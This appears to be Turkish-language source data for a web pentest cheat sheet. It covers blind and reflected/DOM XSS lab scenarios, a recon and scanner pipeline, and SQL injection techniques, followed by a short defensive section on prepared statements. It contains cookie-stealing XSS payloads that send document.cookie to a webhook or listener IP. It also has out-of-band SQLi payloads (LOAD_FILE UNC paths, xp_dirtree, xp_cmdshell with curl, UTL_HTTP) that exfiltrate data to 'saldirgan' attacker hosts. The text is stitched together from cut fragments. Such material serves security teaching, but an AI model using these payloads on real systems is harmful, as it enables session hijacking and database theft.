          {
            "title": "Blind XSS",
            "content": "<ul style=\"list-style:none;padding:0;margin:0;display:grid;gap:8px\">\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">Payload'ın başka bir kullanıcı (genellikle admin) tarafından ve farklı bir sayfada (örn: admin paneli) tetiklenmesiyle oluşan XSS türüdür. Anında sonuç görülmez.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><b>Webhook Kullanımı:</b> XSS'in tetiklendiğini anlamak için dışarıya veri gönderme mekanizmasıdır. Payload'ın tetiklendiği cihazın IP, User-Agent veya Cookie bilgilerini saldırganın dinleme noktasına (örn: <code>webhook.site</code>) iletir.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">Örnek Webhook Payload (Çerez çalma):<br><code>&lt;/textarea&gt;&lt;script&gt;new Image().src='https://[WEBHOOK_ADRESINIZ]?cookie='+document.cookie;&lt;/script&gt;</code></li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">Basit Blind Test Payload: <code>&quot;&gt;&lt;script src=https://xss.hunter.com&gt;&lt;/script&gt;</code></li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">Netcat ile Test: <code>nc -nvlp 4040</code> (Terminalde dinleme)<br>Payload:<code>&lt;/textarea&gt;&lt;script&gt;fetch('http://10.10.198.12:4040?cookie=' + btoa(document.cookie) );&lt;/script&gt;</code> (Çerezleri Base64 ile kodlayıp gönderir.)</li>\n\t\t\t</ul>"
          },
          {
            "title": "Roadmap - Otomatik Test Akışı",
            "content": "<ul style=\"list-style:none;padding:0;margin:0;display:grid;gap:8px\">\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">XSS taramalarına başlamadan önce hedef domainin alt alanlarını, canlı URL'lerini ve parametrelerini otomatik olarak toplama adımları.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><b>1. Alt Alan ve Canlı URL Toplama:</b><br>Tüm alt alanları topla, sadece 200 (OK) dönenleri <code>status200.txt</code> dosyasına kaydet.\n\t\t\t\t\t<div style=\"position:relative;margin-top:5px\">\n\t\t\t\t\t\t<pre style=\"margin:0;white-space:pre-wrap;padding:8px;padding-right:45px;border-radius:6px;background:rgba(0,0,0,0.2)\">subfinder -d example.com -silent -o subdomains.txt\ncat subdomains.txt | httpx -silent -o live_subdomains.txt\ncat live_subdomains.txt | httpx -status-code -mc 200 -silent > status200.txt</pre>\n\t\t\t\t\t\t<button style=\"position:absolute;top:5px;right:5px;padding:6px;border-radius:6px;border:1px solid rgba(0,0,0,0.08);background:transparent;cursor:pointer;color:#e6eef6\"\n\t\t\t\t\t\t\tonclick=\"(function(b){navigator.clipboard.writeText(b.previousElementSibling.innerText);b.innerText='Kopyalandı';setTimeout(()=>b.innerText='💥',1200);})(this)\">💥</button>\n\t\t\t\t\t</div>\n\t\t\t\t</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><b>2. Yansıtılan Parametreleri Bulma (Parameter-Reflect-Finder):</b><br>Canlı URL'lerde yansıtma yapan parametreleri tespit et. Çıkan sorgulara <code>jUbAeR'\"<></code> payload'ı ile manuel test et.\n\t\t\t\t\t<div style=\"position:relative;margin-top:5px\">\n\t\t\t\t\t\t<pre style=\"margin:0;white-space:pre-wrap;padding:8px;padding-right:45px;border-radius:6px;background:rgba(0,0,0,0.2)\">cd parameter-reflect-finder/\npython3 tool.py [ALAN_ADI_VEYA_LISTE_VER]</pre>\n\t\t\t\t\t\t<button style=\"position:absolute;top:5px;right:5px;padding:6px;border-radius:6px;border:1px solid rgba(0,0,0,0.08);background:transparent;cursor:pointer;color:#e6eef6\"\n\t\t\t\t\t\t\tonclick=\"(function(b){navigator.clipboard.writeText(b.previousElementSibling.innerText);b.innerText='Kopyalandı';setTimeout(()=>b.innerText='💥',1200);})(this)\">💥</button>\n\t\t\t\t\t</div>\n\t\t\t\t</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><b>3. Tüm Parametreleri Toplama (ParamSpider):</b><br>Canlı URL listesini döngüye alarak tüm olası parametreleri topla.\n\t\t\t\t\t<div style=\"position:relative;margin-top:5px\">\n\t\t\t\t\t\t<pre style=\"margin:0;white-space:pre-wrap;padding:8px;padding-right:45px;border-radius:6px;background:rgba(0,0,0,0.2)\">cat status200.txt | while read line; do python3 paramspider.py -d $line -o output/; done</pre>\n\t\t\t\t\t\t<button style=\"position:absolute;top:5px;right:5px;padding:6px;border-radius:6px;border:1px solid rgba(0,0,0,0.08);background:transparent;cursor:pointer;color:#e6eef6\"\n\t\t\t\t\t\t\tonclick=\"(function(b){navigator.clipboard.writeText(b.previousElementSibling.innerText);b.innerText='Kopyalandı';setTimeout(()=>b.innerText='💥',1200);})(this)\">💥</button>\n\t\t\t\t\t</div>\n\t\t\t\t</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><b>4. Otomatik XSS Taraması (Dalfox ve XSS Strike):</b><br>Toplanan parametreli URL'ler için Dalfox'u listeyle veya XSS Strike'ı tek URL/parametre için kullan.\n\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t<div style=\"position:relative;margin-top:5px\">\n\t\t\t\t\t\t<pre style=\"margin:0;white-space:pre-wrap;padding:8px;padding-right:45px;border-radius:6px;background:rgba(0,0,0,0.2)\">dalfox file status200.txt -o dalfox_results.txt</pre>\n\t\t\t\t\t\t<button style=\"position:absolute;top:5px;right:5px;padding:6px;border-radius:6px;border:1px solid rgba(0,0,0,0.08);background:transparent;cursor:pointer;color:#e6eef6\"\n\t\t\t\t\t\t\tonclick=\"(function(b){navigator.clipboard.writeText(b.previousElementSibling.innerText);b.innerText='Kopyalandı';setTimeout(()=>b.innerText='💥',1200);})(this)\">💥</button>\n\t\t\t\t\t</div>\n\n\t\t\t\t\t\n\t\t\t\t\t<div style=\"position:relative;margin-top:5px\">\n\t\t\t\t\t\t<pre style=\"margin:0;white-space:pre-wrap;padding:8px;padding-right:45px;border-radius:6px;background:rgba(0,0,0,0.2)\">python3 xsstrike.py -u https://example.com/?id=neon</pre>\n\t\t\t\t\t\t<button style=\"position:absolute;top:5px;right:5px;padding:6px;border-radius:6px;border:1px solid rgba(0,0,0,0.08);background:transparent;cursor:pointer;color:#e6eef6\"\n\t\t\t\t\t\t\tonclick=\"(function(b){navigator.clipboard.writeText(b.previousElementSibling.innerText);b.innerText='Kopyalandı';setTimeout(()=>b.innerText='💥',1200);})(this)\">💥</button>\n\t\t\t\t\t</div>\n\t\t\t\t</li>\n\t\t\t</ul>"
          },
          {
            "title": "Örnek XSS Senaryoları",
            "content": "<ul style='list-style:none;padding:0;margin:0;display:grid;gap:8px'>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 1 - Reflected XSS (HTML Tag Injection)</summary><div style='margin-top:10px;'><strong>Kaynak Kod:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;p&gt;\n\t&lt;a id=\"author\" href=\"https://x.com\"&gt;&lt;/a&gt;\n\t{PAYLOAD}\n\t&lt;img class=\"avatar\" src=\"/resources/images/avatarDefault.svg\"&gt;\n&lt;/p&gt;</pre><strong style='margin-top:10px;display:block;'>Payload:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;/p&gt;&lt;img src=x onerror=alert(1)&gt;</pre></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 2 - Reflected XSS (Event Handler - onresize)</summary><div style='margin-top:10px;'><strong>Kaynak Kod:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;h1&gt;0 search results for 'neon'&lt;/h1&gt;</pre><div style='margin-top:5px;'>Sadece belirli taglere izin veriliyor. Deneme icin Intruder kullanildi.</div><strong style='margin-top:10px;display:block;'>Payload:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>neon'&lt;/h1&gt;&lt;body onresize=print()&gt;</pre></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 3 - Reflected XSS (Custom Tag &amp; onfocus)</summary><div style='margin-top:10px;'><strong>Kaynak Kod:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;h1&gt;0 search results for 'neon'&lt;/h1&gt;</pre><div style='margin-top:5px;'>Lab sadece ozel etiketlere (custom tags) izin veriyor.</div><strong style='margin-top:10px;display:block;'>Payload:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>neon'&lt;/h1&gt;&lt;mehmet onfocus=alert(document.cookie) autofocus tabindex=0&gt;&lt;/mehmet&gt;</pre><strong style='margin-top:10px;display:block;'>Not:</strong><div style='margin-top:5px;'><b>tabindex=0 (ekleme sebebi)</b> -&gt; Tarayıcılar, <code>autofocus</code>'a rağmen özel tag'lere nasıl odaklanacağını bilemez. <code>tabindex=0</code> bunu zorunlu kılar.</div></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 4 - Reflected XSS (SVG &amp; animatetransform)</summary><div style='margin-top:10px;'><strong>Kaynak Kod:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;h1&gt;0 search results for 'neon'&lt;/h1&gt;</pre><strong style='margin-top:10px;display:block;'>Keşif Süreci (Açıklama):</strong><div style='margin-top:5px;'>1. <code>?search=&lt;$neon$&gt;</code> -&gt; Intruder -&gt; Tüm HTML tag'lerini tara. (Lab'ın <code>svg</code> tag'ine izin verdiğini keşfet.)<br>2. <code>?search=&lt;svg&gt;&lt;$neon$&gt;</code> -&gt; Intruder -&gt; <code>animate</code>, <code>animatemotion</code>, <code>animatetransform</code> gibi SVG tag'lerini tara. (<code>animatetransform</code> tag'ine izin verdiği keşfet.)<br>3. <code>?search=&lt;svg&gt;&lt;animatetransform%20$neon$=alert(1)&gt;</code> -&gt; Intruder -&gt; Tüm event handler'ları (<code>onbegin</code>, <code>onload</code> vb.) tara. (<code>onbegin</code> event'ine izin verdiği keşfet.)</div><strong style='margin-top:10px;display:block;'>Payload:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;svg&gt;&lt;animatetransform onbegin=alert(1)&gt;</pre></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 5 - Reflected XSS (link canonical &amp; accesskey)</summary><div style='margin-top:10px;'><strong>Kaynak Kod:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;link rel=\"canonical\" href='https://0a1c.web-security-academy.net/'/&gt;</pre><strong style='margin-top:10px;display:block;'>Payload:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>'accesskey='x'onclick='alert(1)</pre><strong style='margin-top:10px;display:block;'>Zafiyetli URL:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>https://0a1c.web-security-academy.net/'accesskey='x'onclick='alert(1)</pre><strong style='margin-top:10px;display:block;'>Not:</strong><div style='margin-top:5px;'>Payload, <code>href</code> attribute'ünden kaçar ve <code>&lt;link&gt;</code> tag'ine <code>onclick</code> ekler. Kullanici ALT + X (veya ALT + SHIFT + X) tuslarina bastiginda XSS tetiklenir.</div></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 6 - Reflected XSS (onclick sink &amp; &amp;apos; bypass)</summary><div style='margin-top:10px;'><strong>Kaynak Kod:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;!-- Sunucu, 'Website' girdisini alıp hem href'e hem onclick'e basıyor --&gt;\n&lt;a id=\"author\"\n\thref=\"{PAYLOAD}\" \n\tonclick=\"var tracker={track(){}};\n\ttracker.track('{PAYLOAD}');\"&gt;\n\tMehmet Ince\n&lt;/a&gt;</pre><strong style='margin-top:10px;display:block;'>Payload:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>http://mehmet?&amp;apos;-alert(1)-&amp;apos;</pre><strong style='margin-top:10px;display:block;'>Açıklama:</strong><div style='margin-top:5px;'>Sunucu, <code>'</code> karakterini <code>&amp;apos;</code> olarak HTML-encode eder. Bu, <code>href</code> attribute'ünü bozmaz. Ancak HTML parser, sayfayı render ederken <code>onclick</code> içindeki <code>&amp;apos;</code> kodunu tekrar <code>'</code> karakterine çevirir. Tıklandığında JS, <code>tracker.track('http://mehmet?'</code> (string biter) <code>-alert(1)-</code> (kod çalışır) <code>''</code> (boş string) olarak çalışır.</div></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 7 - DOM XSS (javascript: in href)</summary><div style='margin-top:10px;'><strong>Kaynak Kod:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;a id='author' href='PAYLOAD'&gt;neon&lt;/a&gt;</pre><strong style='margin-top:10px;display:block;'>Payload:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>javascript:alert(1)</pre></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 8 - DOM XSS (jQuery :contains sink)</summary><div style='margin-top:10px;'><strong>Kaynak Kod:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;script&gt;\n\t$(window).on('hashchange', function(){\n\t\tvar post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');\n\t\tif (post) post.get(0).scrollIntoView(); \n\t});\n&lt;/script&gt;</pre><strong style='margin-top:10px;display:block;'>Payload:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>#&lt;img src=x onerror=print()&gt;</pre><strong style='margin-top:10px;display:block;'>Açıklama:</strong><div style='margin-top:5px;'><code>hashchange</code> olayı tetiklendiğinde, script URL hash'ini (<code>#</code> sonrası) alır ve jQuery <code>:contains</code> seçicisine sokar. Eski jQuery versiyonları, bu seçiciyi parse ederken HTML olarak DOM'a enjekte eder ve <code>&lt;img&gt;</code> tag'i çalışır.</div></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 9 - DOM XSS (document.write sink)</summary><div style='margin-top:10px;'><strong>Kaynak Kod:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;script&gt;\n\tvar searchTerms = '{PAYLOAD}';\n\tdocument.write('&lt;img src=\"/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'\"&gt;');\n&lt;/script&gt;</pre><strong style='margin-top:10px;display:block;'>Payload (1):</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>'-alert(1)-'</pre><strong style='margin-top:10px;display:block;'>Payload (2):</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>';alert(1)//</pre><strong style='margin-top:10px;display:block;'>Açıklama:</strong><div style='margin-top:5px;'>Payload 2, <code>searchTerms</code> değişkeninin string atamasından kaçar. Kod <code>var searchTerms = '';</code> (string biter), <code>alert(1)</code> (kod çalışır) ve <code>//</code> (satırın kalanını yorum yapar) olarak çalışır. <code>encodeURIComponent</code> fonksiyonu hiç çalışmaz.</div></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 10 - DOM XSS (document.write &amp; option injection)</summary><div style='margin-top:10px;'><strong>Kaynak Kod:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;script&gt;\n\tvar stores = [\"London\",\"Paris\",\"Milan\"];\n\tvar store = (new URLSearchParams(window.location.search)).get('storeId');\n\tdocument.write('&lt;select name=\"storeId\"&gt;');\n\tif(store) {\n\t\tdocument.write('&lt;option selected&gt;'+store+'&lt;/option&gt;');\n\t}\n&lt;/script&gt;</pre><strong style='margin-top:10px;display:block;'>Payload:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;/option&gt;&lt;script&gt;alert(1)&lt;/script&gt;</pre><strong style='margin-top:10px;display:block;'>Açıklama:</strong><div style='margin-top:5px;'>Payload, <code>store</code> değişkeni ile <code>document.write</code>'a gider, mevcut <code>&lt;option&gt;</code> etiketini kapatır ve yeni bir <code>&lt;script&gt;</code> etiketi enjekte eder.</div></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 11 - DOM XSS (eval() sink)</summary><div style='margin-top:10px;'><strong>Kaynak Kod:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;script&gt;\n\tvar q = (new URLSearchParams(location.search)).get('q');\n\teval('var r = \"Arama: ' + q + '\";');\n&lt;/script&gt;</pre><strong style='margin-top:10px;display:block;'>Payload:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>';alert(1)//</pre><strong style='margin-top:10px;display:block;'>Açıklama:</strong><div style='margin-top:5px;'>Payload, <code>eval()</code> içindeki string'den kaçar. <code>eval()</code> şu kodu çalıştırır: <code>var r = 'Arama: '';</code> (string'i bitir), <code>alert(1);</code> (kodu çalıştır), <code>//';</code> (kalanı yorum yap).</div></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 12 - DOM XSS (Backslash Escape Bypass)</summary><div style='margin-top:10px;'><strong>Kaynak Kod:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;script&gt;\n\tvar searchTerms = '{PAYLOAD}';\n\tdocument.write('&lt;img src=\"/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'\"&gt;');\n&lt;/script&gt;</pre><strong style='margin-top:10px;display:block;'>Sunucu Önlemi (Açıklama):</strong><div style='margin-top:5px;'>Site, payload içindeki <code>'</code> karakterini <code>\\'</code> ile ve <code>\\</code> karakterini <code>\\\\</code> ile değiştiriyor.</div><strong style='margin-top:10px;display:block;'>Payload:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>\\'-alert(1)//</pre><strong style='margin-top:10px;display:block;'>Açıklama:</strong><div style='margin-top:5px;'>1. Girdi: <code>\\'-alert(1)//</code><br>2. Sunucu <code>\\</code> işaretini <code>\\\\</code> yapar, <code>'</code> işaretini <code>\\'</code> yapar.<br>3. Kodun son hali: <code>var searchTerms = '\\\\'-alert(1)//';</code><br>4. JS parser bunu şöyle okur: <code>var searchTerms = '\\'</code> (string biter, içinde tek bir <code>\\</code> karakteri var) + <code>-alert(1)</code> (kod çalışır) + <code>//';</code> (geri kalan yorum satırı).</div></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 13 - DOM XSS (Template Literal Injection via eval)</summary><div style='margin-top:10px;'><strong>Kaynak Kod:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;script&gt;\n\tvar query = (new URLSearchParams(location.search)).get('q');\n\t// Zafiyetli kısım: Girdiyi eval() ile çalıştırmak\n\teval(\`document.getElementById('searchMessage').innerText = \`Search for ${query}\`;\`);\n&lt;/script&gt;</pre><strong style='margin-top:10px;display:block;'>Payload:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>${alert(1)}</pre><strong style='margin-top:10px;display:block;'>Açıklama:</strong><div style='margin-top:5px;'><b>Kritik Hata:</b> Girdi <code>innerText</code>'e gitseydi güvende olurdu. Ancak site, girdiyi backtick (<code>\`</code>) ile oluşturulan bir string'in içine koyup <b><code>eval()</code></b> ile çalıştırıyor.<br><code>eval()</code> fonksiyonu, <code>${alert(1)}</code> payload'ını bir JS ifadesi olarak algılar, çalıştırır ve sonra (<code>alert</code>'ten <code>undefined</code> döndüğü için) <code>innerText</code>'e atar.</div></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 14 - CSTI (AngularJS)</summary><div style='margin-top:10px;'><strong>Kaynak Kod:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;!-- AngularJS 1.7.7 (veya benzeri) --&gt;</pre><strong style='margin-top:10px;display:block;'>Payload (Test):</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>{{7*7}}</pre><div style='margin-top:5px;'>-&gt; Sitenin ciktisi 49 ise Client-Side Template Injection (CSTI) vardır.</div><strong style='margin-top:10px;display:block;'>Payload (XSS):</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>{{constructor.constructor('alert(1)')()}}</pre></div></details></li>\n\t\t\t\t"

      <p class="small" style="margin-bottom:15px;">Uygulama hiçbir çıktı veya hata dönmüyorsa, veritabanı sunucusunun yanıt verme süresi (gecikme / latency) manipüle edilerek veriler sızdırılır.</p>

-- DURUM B: Doğru Yöntem - Spesifik Şart veya AND Kullanımı
username=admin' and sleep(5)#&password=test
-> Yanıt 5 saniye sonra döndü!
<br>NEDENİ: Short-circuit değerlendirmesi gereği username='admin' şartı diğer kullanıcılar için FALSE verdiğinden sleep(5) çalıştırmaz. Yalnızca admin olan tek satırda TRUE olduğu için 5 sn bekler.</pre>

          <strong style="color:var(--accent);display:block;margin-bottom:6px;">ADIM 2: CPU Yoğunluklu Testler (Benchmark Method)</strong>
          <p class="small" style="margin-bottom:5px;"><code>SLEEP()</code> fonksiyonunun engellendiği durumlarda işlemciye yoğun yük bindirerek zaman gecikmesi oluşturulur.</p>

          <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin:0;white-space:pre-wrap;word-break:break-all;">-- MySQL IF Yapısı:
asd' OR IF(MID(@@version,1,1)='5', sleep(5) , 1         )='2#

    <details>
    <summary style="cursor:pointer;font-weight:bold;font-size:14px;padding:6px 0;color:var(--accent);">Detayları Göster / Gizle</summary>
    <div style="margin-top:10px;">
    <p class="small" style="margin-bottom:15px;">Uygulama hiçbir hata döndürmediğinde, sonuçları ekrana yansıtmadığında ve Time-Based teknikler WAF/ağ gecikmesi nedeniyle güvenilmez olduğunda kullanılır.<br>Saldırgan, hedef veritabanını <b>DNS</b> veya <b>HTTP</b> protokolleri üzerinden kendi kontrolündeki harici bir sunucuya (Burp Collaborator, interactsh, dnslog) istek atmaya zorlar.</p>
    
    <ul style="list-style:none;padding:0;margin:0;display:grid;gap:12px">
      <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
        <strong style="color:var(--accent);display:block;margin-bottom:6px;">1. DNS-BASED OOB SQLi (En Güvenilir Kanal)</strong>
        <p class="small" style="margin-bottom:5px;">DNS istekleri güvenlik duvarlarından (Firewall/Egress filtreleri) neredeyse her zaman geçebildiği için en yaygın OOB yöntemidir. Veri, alt alan adı (subdomain) olarak sorgulatılarak dışarı sızdırılır.</p>
        
        <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin:0;white-space:pre-wrap;word-break:break-all;">-- MySQL / MariaDB (UNC / SMB Yolu Tetikleme):
GET /product.php?id=1' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT version()), '.saldirgan.dnslog.cn\\\\a'))-- -

-- Microsoft SQL Server (master..xp_dirtree ile DNS Sorgusu):
'; EXEC master..xp_dirtree '\\\\saldirgan.burpcollaborator.net\\pay';--

-- Oracle (UTL_INADDR / DBMS_LDAP):
' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS('saldirgan.interact.sh') FROM dual--</pre>
        <span class="small" style="color:#64748b;">DNS Log Çıktısı: <code>10.5.12-MariaDB.saldirgan.dnslog.cn</code> adresine DNS A/AAAA sorgusu düşer.</span>

POST /search HTTP/1.1
search=keyword'; EXEC xp_cmdshell 'curl http://saldirgan.com/?data=(SELECT @@version)'--

-- Oracle (UTL_HTTP Paketi):
SELECT UTL_HTTP.REQUEST('http://saldirgan.com/'||(SELECT user FROM dual)) FROM dual;</pre>
        <span class="small" style="color:#64748b;">HTTP Access Log: <code>GET /?data=Microsoft%20SQL%20Server%202019 HTTP/1.1</code></span>
      </li>
    </ul>
    </div>
    </details>

          {
  title: "5. Savunma Yaklaşımı (Defansif Kodlama & SQLi Korunması)",
  content: `
    <details>
    <summary style="cursor:pointer;font-weight:bold;font-size:14px;padding:6px 0;color:var(--accent);">Detayları Göster / Gizle</summary>
    <div style="margin-top:10px;">
    <p class="small" style="margin-bottom:15px;">SQL Injection zafiyetini engellemenin tek ve kesin yolu <b>Kullanıcı Girdisi (Input) ile SQL Komutunu Birbirinden Ayırmaktır</b>.<br>Girdileri hiçbir zaman dinamik olarak SQL sorgusuna yapıştırmamalıyız.</p>

    <ul style="list-style:none;padding:0;margin:0;display:grid;gap:12px">
      
      <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
        <strong style="color:var(--accent);display:block;margin-bottom:6px;">1. PARAMETRELİ SORGU KULLANIMI (Prepared Statements / Parameterized Queries)</strong>
        <p class="small" style="margin-bottom:5px;">%100 etkili ana savunma hattıdır. Veritabanı sorgunun şablonunu önceden derler; kullanıcıdan gelen girdi 'komut' olarak değil, 'sadece veri' olarak işlenir.</p>
        
        <pre style="background:rgba(0,0,0,0.3);padding:10px;border-radius:6px;margin:0;white-space:pre-wrap;word-break:break-word;font-family:monospace;color:#ef4444;"><span style="color:#64748b;">// ❌ HATALI / VULNERABLE (String Birleştirme):</span>
$query = "SELECT * FROM users WHERE username = '" . $_POST['user'] . "' AND password = '" . $_POST['pass'] . "'";
$db->query($query);</pre>

        <pre style="background:rgba(0,0,0,0.3);padding:10px;border-radius:6px;margin:8px 0 0 0;white-space:pre-wrap;word-break:break-word;font-family:monospace;color:#22c55e;"><span style="color:#64748b;">// ✅ GÜVENLİ / SECURE (PDO Prepared Statement):</span>
$stmt = $pdo->prepare('SELECT id, password_hash FROM users WHERE username = :username');
$stmt->execute(['username' => $_POST['user']]);
$user = $stmt->fetch();</pre>
      </li>

      <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
        <strong style="color:var(--accent);display:block;margin-bottom:6px;">2. ORM (Object-Relational Mapping) KULLANIMI</strong>
        <p class="small" style="margin-bottom:5px;">Modern framework'ler (Laravel Eloquent, Django ORM, Entity Framework vb.) varsayılan olarak parametreli sorgu kullanır.</p>
        
